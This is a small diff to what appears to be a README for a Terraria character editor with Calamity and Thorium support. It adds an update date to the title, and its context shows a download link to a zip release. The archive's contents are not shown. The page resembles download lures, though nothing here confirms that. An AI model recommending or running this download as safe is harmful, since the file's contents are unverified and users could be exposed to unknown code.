@@ -1,4 +1,4 @@
-# Terraria Character Editor 1.4.5+ | Calamity & Thorium Full Support
+# Terraria Character Editor 1.4.5+ | Calamity & Thorium Full Support UPD 03.15.2026
 
 <p align="center">
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/download/1.0/Terraria.Inventory.Editor.2026.03.10.zip">
